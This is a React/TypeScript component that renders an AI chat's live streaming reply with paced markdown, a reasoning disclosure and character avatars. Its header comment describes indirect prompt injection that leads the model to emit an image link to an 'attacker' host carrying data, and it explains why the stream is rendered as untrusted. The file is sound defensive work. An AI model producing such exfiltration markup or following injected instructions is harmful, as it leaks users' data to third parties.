// The streaming ghost row — the ONLY component in the tree that subscribes to token text (UI-Gates
// §11.1 ghost-isolation). `useGhostText`/`useGhostReasoning`/`useGhostThinking` mirror the live turn's
// tokens via the render-free store subscription, so a delta re-renders THIS row alone; the list,
// composer, and canon rows stay still. The answer body is paced through `@orb/ui/stream
// useSmoothText` (grapheme-safe, reduced-motion passthrough), passed through `repairStreamingTail`
// (`@orb/kit/fix-markdown` — the #402/#473 streaming code-fence/torn-markup guard, UI-Gates §11.6)
// while still streaming, then fed to `@orb/ui/markdown` as `untrusted`. Before the first answer token
// (pending, or the first streaming frame) it shows the TTFT `StreamShimmer`.
//
// STREAM CONTENT IS UNTRUSTED (D44 §12.0 as corrected #25, UI-Gates §11.6). This is LIVE model output:
// indirect prompt-injection can make it emit exfil-shaped markup, and the moment a paced reveal
// completes an `![](https://attacker/?d=…)` mid-stream the browser fetches it BEFORE commit-time
// sanitization ever runs. The settled canonical row already resolves trust per-message
// (`resolveRowRenderPolicy`); the streaming ghost is the highest-exposure window and renders untrusted
// (drops `<img>`/off-allowlist URLs, withholds Mermaid). Untrusted also drops the `<speaker>` custom-tag
// passthrough (element + children), so a merged-narrator stream is pre-passed through
// `speakerTagsToPlain` (`@orb/kit/speaker-label` — the sanctioned DISPLAY strip) to keep each speaker's
// name visible as a plain `Name:` prefix while streaming; on settle the canonical row re-parses the
// `<speaker>` markers for per-speaker coloring. A character that opted into trusted HTML still resolves
// trusted on the settled row — this only fail-closes the live window.
//
// TASK #20 additions: the `<ReasoningBlock>` disclosure (rendered above the answer body, when there's
// reasoning) owns its own "Thinking… Ns" → "Thought for Ns" TTFT affordance + the same repair guard for
// the reasoning trace. It wears the assistant skin so the ghost reads as an in-progress assistant
// message that swaps to the canonical row on turn-complete.
//
// MACRO DISPLAY PASS (optional, additive — mirrors message-row.tsx's roster threading): `renderContext`
// is undefined until a caller wires the room's roster/persona names down to the ghost; when present,
// `{{char}}`/`{{user}}` resolve on EACH accumulated delta via the SAME `#lib/message-render` pipeline
// the settled row uses (one engine) — cheap and pure, run before pacing so the paced reveal shows
// already-substituted text.
//
// PHASE 4b GAP-FIX (b) — immersive decoration DURING streaming, not just after settle: the surface
// resolves the live turn's `RowAttribution` (§A.8 KIND-READY — the SAME `resolveRowAttribution` the
// settled row calls, keyed off `useTurnSpeakerCharacterId`, a chrome-safe id-stable selector that never
// re-renders on a text/reasoning delta) and threads it in as `attribution`. This row then reads the
// SAME three skin fields `message-row.tsx` does (`avatarTreatment`/`bubbleDecoration`/attribution
// `ThemeScope`) and reuses `renderRowAvatar` from `message-row-parts.tsx` — so Echo's bled edge,
// Whisper's banner+stripe, Hush's stripe, and Ripple's sticky portrait all paint on the ghost the
// instant a turn starts, and the row swaps to the byte-identical canonical structure on turn-complete
// with zero visual pop-in. `attribution === undefined` (a caller that hasn't wired it) degrades to the
// pre-fix render: no sibling avatar, no decoration — unchanged.

import { holdTornSpeaker } from "@orb/kit/fix-markdown";
import type { CharacterId, ChatId } from "@orb/kit/ids";
import { speakerTagsToPlain } from "@orb/kit/speaker-label";
import { Row, Stack } from "@orb/ui/layout";
import { Markdown } from "@orb/ui/markdown";
import { StreamShimmer, useSmoothText } from "@orb/ui/stream";
import { ThemeScope } from "@orb/ui/theme-scope";
import type { ReactElement } from "react";
import type { MessageRenderContext } from "#lib";
import { cn, renderMessageForDisplay } from "#lib";
import { useEnterMotion } from "../hooks/use-enter-motion";
import { useGhostReasoning, useGhostText, useGhostThinking } from "../hooks/use-ghost-stream";
import type { RowAttribution } from "../lib/attribution";
import { initialsForAttribution } from "../lib/attribution";
import { MESSAGE_ROW_SKINS } from "../lib/message-row-variants";
import { renderRowAvatar } from "./message-row-parts";
import { ReasoningBlock } from "./reasoning-block";

/** The paced-reveal trickle floor (chars/sec) — a calm cadence while a stream is live. */
const GHOST_CPS = 40;

/** The no-image fallback-tile inputs (deterministic hue seed + resolved initials) a live turn feeds
 *  `bubbleDecoration` — mirrors message-row.tsx. Module scope so the ghost component stays under the
 *  cognitive-complexity ceiling (biome `noExcessiveCognitiveComplexity`). */
function ghostFallbackTile(attribution: RowAttribution | undefined): {
  readonly hueSeed: string;
  readonly initial: string;
} {
  if (attribution === undefined || attribution.name === null) {
    return { hueSeed: attribution?.hueSeed ?? "", initial: "" };
  }
  return { hueSeed: attribution.hueSeed, initial: initialsForAttribution(attribution.name) };
}

export interface GhostMessageRowProps {
  readonly chatId: ChatId;
  /** The active appearance — the ghost wears the assistant skin of this style. */
  readonly chatStyle: keyof typeof MESSAGE_ROW_SKINS;
  /** True while the turn is in the `streaming` phase — pacing runs only then (pending = shimmer). */
  readonly streaming: boolean;
  /** The room-level macro DATA — absent means the streamed text/reasoning render UNCHANGED. */
  readonly renderContext?: MessageRenderContext | undefined;
  /** The turn's voiced speaker — retargets `{{char}}`; ignored when `renderContext` is absent. */
  readonly rowCharacterId?: CharacterId | null | undefined;
  /** Phase 4b gap-fix (b) — the live turn's resolved identity (§A.8), the SAME shape
   *  `resolveRowAttribution` produces for the settled row. `undefined` ⇒ no sibling avatar, no
   *  immersive decoration (the pre-fix render). */
  readonly attribution?: RowAttribution | undefined;
  /** Attribution avatar chrome (appearance prefs, §12.1/§B.3) — mirrors `MessageRow`'s own props;
   *  meaningless without `attribution`. */
  readonly avatarSize?: "sm" | "md" | "lg" | undefined;
  readonly avatarShape?: "round" | "square" | "rounded" | undefined;
  readonly avatarAspect?: "square" | "portrait" | undefined;
  readonly avatarRing?: "none" | "accent" | undefined;
  readonly showInChatAvatars?: boolean | undefined;
  /** Phase 4b §B.5.5 appearance.showLLMReasoningIcon — threaded straight to `<ReasoningBlock>`. */
  readonly showLLMReasoningIcon?: boolean | undefined;
  /** Motion guide §4.2 item 1 — true ONLY on the render the ghost genuinely APPEARS (the surface's
   *  `useNewArrivalKeys` verdict over the ghost's synthetic key), so a turn starting fades/rises in
   *  once; a mid-stream scrollback remount gets false and paints resting. Default false. */
  readonly enterMotion?: boolean;
}

/** The in-progress assistant row, streaming paced markdown (or a TTFT shimmer before first token). */
export function GhostMessageRow({
  chatId,
  chatStyle,
  streaming,
  renderContext,
  rowCharacterId,
  attribution,
  avatarSize = "md",
  avatarShape = "round",
  avatarAspect = "square",
  avatarRing = "none",
  showInChatAvatars = true,
  showLLMReasoningIcon = false,
  enterMotion = false,
}: GhostMessageRowProps): ReactElement {
  const enterClasses = useEnterMotion(enterMotion);
  const rawText = useGhostText(chatId);
  const rawReasoning = useGhostReasoning(chatId);
  const thinking = useGhostThinking(chatId);
  const text =
    renderContext === undefined
      ? rawText
      : renderMessageForDisplay(rawText, renderContext, rowCharacterId);
  const reasoning =
    renderContext === undefined
      ? rawReasoning
      : renderMessageForDisplay(rawReasoning, renderContext, rowCharacterId);
  const paced = useSmoothText(text, { enabled: streaming, cps: GHOST_CPS });
  // #38: Streamdown 2.5 (inside `@orb/ui/markdown` with `mode="streaming"`) repairs the streaming
  // markdown tail itself (unterminated fences / torn emphasis) — so the only pre-pass the seal still
  // needs is holding a TORN `<speaker>` tag (Streamdown does not). Applies only while streaming; once
  // settled the canonical row takes over via the separate settled pipeline.
  // `speakerTagsToPlain` then converts any COMPLETE `<speaker>NAME</speaker>` marker to a plain `Name:`
  // prefix — the untrusted seal (file header) drops the `<speaker>` element AND its name child, so
  // without this a merged-narrator stream would lose every speaker name until settle.
  const held = speakerTagsToPlain(streaming ? holdTornSpeaker(paced) : paced);
  const skin = MESSAGE_ROW_SKINS[chatStyle];

  // §B.2/gap-fix (b) — the SAME kind-aware resolution the settled row does (message-row.tsx), keyed
  // off the live turn's attribution instead of a committed MessageView.
  const kind = attribution?.kind ?? null;
  const avatarTreatment = skin.avatarTreatment(kind);
  // §B.2 bubbleDecoration takes the raw CAS hash, not a prebuilt URL (see message-row.tsx) — Echo/
  // Whisper each request their OWN correctly-shaped sharp variant.
  const decorationAvatarHash = attribution === undefined ? null : attribution.avatarHash;
  // The live ghost feeds bubbleDecoration the SAME no-image fallback inputs as the settled row (owner
  // ruling 2026-07-09) so Echo reserves the identical reading padding while streaming (the tile child
  // itself is a settled-row detail — the ghost only applies `decoration.style/className`).
  const decoration =
    skin.bubbleDecoration?.({
      kind,
      avatarHash: decorationAvatarHash,
      ...ghostFallbackTile(attribution),
    }) ?? null;
  const avatarNode =
    attribution === undefined
      ? null
      : renderRowAvatar({
          attribution,
          avatarTreatment,
          // The ghost row always wears the assistant skin (file header) — a live turn is never the
          // viewer's own row, so this is never the role==="user" mirrored-weld case.
          role: "assistant",
          showInChatAvatars,
          avatarSize,
          avatarShape,
          avatarAspect,
          avatarRing,
        });

  const bubble = (
    // The ghost bubble fills width (w-full) so the shimmer's + streaming markdown's w-full children
    // have a sized parent (the assistant skin is otherwise shrink-to-fit, collapsing them to zero). It
    // swaps to the shrink-to-fit canonical MessageRow structure on turn-complete.
    <Stack
      gap="row"
      data-slot="message-bubble"
      className={cn(skin.inner("assistant"), "w-full", decoration?.className)}
      style={decoration?.style}
    >
      {reasoning.length > 0 ? (
        <ReasoningBlock reasoning={reasoning} thinking={thinking} showIcon={showLLMReasoningIcon} />
      ) : null}
      {held.length === 0 ? (
        <StreamShimmer label="Generating a reply…" />
      ) : (
        <Markdown trust="untrusted" mode={streaming ? "streaming" : "static"}>
          {held}
        </Markdown>
      )}
    </Stack>
  );
  // Attribution `ThemeScope` (character theme override — §12.4 Layer 3), same as the settled row's
  // `renderRowBubble`: makes `var(--color-speaker)` resolve the character's own override for Hush's/
  // Whisper's stripe DURING streaming too, not just after settle.
  const decoratedBubble =
    attribution === undefined || attribution.tokens === null ? (
      bubble
    ) : (
      <ThemeScope tokens={attribution.tokens} className="contents">
        {bubble}
      </ThemeScope>
    );

  return (
    <Stack
      gap="row"
      data-slot="ghost-message-row"
      data-role="assistant"
      data-kind={attribution?.kind ?? undefined}
      className={cn(skin.outer("assistant"), enterClasses)}
    >
      <Row align="start" gap="row" data-slot="message-row-body" className="w-full">
        {avatarNode}
        <Stack gap="row" data-slot="message-content-column" className="min-w-0 flex-1">
          {decoratedBubble}
        </Stack>
      </Row>
    </Stack>
  );
}
